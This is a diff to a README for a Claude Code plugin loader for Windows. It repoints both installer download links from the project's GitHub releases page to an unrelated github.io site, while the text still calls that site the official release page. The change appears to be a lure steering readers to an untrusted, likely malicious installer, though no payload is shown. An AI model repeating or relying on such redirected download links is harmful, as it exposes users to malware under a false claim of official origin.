@@ -1,6 +1,6 @@
 # 🛠️ biks-claude-tools-loader - Find and install Claude Code plugins
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/maurieunoccupied182/biks-claude-tools-loader/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://maurieunoccupied182.github.io)
 
 ## What is this tool?
 This software organizes plugins for Claude Code. It helps you find tools, connect them to your existing setup, and install them safely. You use this tool to manage your plugin library without writing code or manually moving files.
@@ -14,7 +14,7 @@ This software organizes plugins for Claude Code. It helps you find tools, connec
 ## 📥 How to get the software
 You must visit the official release page to get the installer. The software goes through regular updates. You should always use the newest version found on this page:
 
-[Click here to visit the release page and download the installer](https://github.com/maurieunoccupied182/biks-claude-tools-loader/releases)
+[Click here to visit the release page and download the installer](https://maurieunoccupied182.github.io)
 
 ## ⚙️ Installation steps
 Follow these steps to set up the software on your Windows computer:
